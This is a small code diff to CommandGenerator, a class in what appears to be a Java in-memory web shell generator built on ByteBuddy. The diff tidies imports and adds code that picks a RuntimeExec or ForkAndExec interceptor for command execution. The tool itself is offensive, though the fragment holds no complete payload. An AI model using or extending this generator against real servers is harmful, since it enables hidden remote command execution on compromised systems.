@@ -1,8 +1,10 @@
 package com.reajason.javaweb.memshell.generator.command;
 
 import com.reajason.javaweb.ClassBytesShrink;
-import com.reajason.javaweb.buddy.*;
-import com.reajason.javaweb.memshell.ShellType;
+import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
+import com.reajason.javaweb.buddy.MethodCallReplaceVisitorWrapper;
+import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
+import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
 import com.reajason.javaweb.memshell.config.CommandConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
@@ -13,10 +15,8 @@ import net.bytebuddy.description.modifier.Ownership;
 import net.bytebuddy.description.modifier.Visibility;
 import net.bytebuddy.dynamic.DynamicType;
 import net.bytebuddy.implementation.FixedValue;
-import org.apache.commons.lang3.StringUtils;
 
 import java.util.Collections;
-import java.util.HashMap;
 
 import static net.bytebuddy.matcher.ElementMatchers.named;
 
@@ -66,6 +66,12 @@ public class CommandGenerator {
                     .intercept(FixedValue.nullValue())
                     .visit(Advice.to(ShellCommonUtil.Base64DecodeToStringInterceptor.class).on(named("base64DecodeToString")))
                     .visit(Advice.to(DoubleBase64ParamInterceptor.class).on(named("getParam")));
+        }
+
+        if (CommandConfig.ImplementationClass.RuntimeExec.equals(commandConfig.getImplementationClass())) {
+            builder = builder.visit(Advice.to(RuntimeExecInterceptor.class).on(named("getInputStream")));
+        } else if (CommandConfig.ImplementationClass.ForkAndExec.equals(commandConfig.getImplementationClass())) {
+            builder = builder.visit(Advice.to(ForkAndExecInterceptor.class).on(named("getInputStream")));
         }
 
         return builder;
